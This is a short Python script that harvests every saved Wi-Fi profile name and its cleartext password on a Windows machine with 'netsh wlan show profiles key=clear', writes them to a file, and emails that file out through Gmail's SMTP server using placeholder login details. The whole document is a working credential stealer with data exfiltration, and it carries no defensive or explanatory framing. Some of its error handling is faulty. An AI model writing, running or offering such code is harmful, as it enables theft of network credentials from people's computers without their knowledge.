import subprocess
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

server = smtplib.SMTP('smtp.gmail.com', '587')

server.starttls()

server.login('<GmailAccount>', '<GmailPassword>')

msg = MIMEMultipart()
msg['From'] = '<Sender>'
msg['To'] = '<Recipent>'
msg['Subject'] = '<Subject>'

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')

wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]

for wifi in wifis:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', wifi, 'key=clear']).decode('utf-8').split('\n')
    results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
    try:
        info = f'NAME: {wifi} | PASSWORD: {results[0]} '
        with open('WIFI.txt', 'a') as f:
            f.write(info)
            f.write('\n')
    except IndexError:
        info = f'NAME: {wifi} | PASSWORD: N/A'
        with open('WIFI.txt', 'a') as f:
            f.write(info)
            f.write('\n')

with open('WIFI.txt', 'r') as f:
    message = f.read()

msg.attach(MIMEText(message, 'plain'))

text = msg.as_string()
try:
    server.sendmail('<GmailAccount>', '<GmailPassword>', text)
    print('SENT')
except IndexError:
    print('NO CONNECTION')

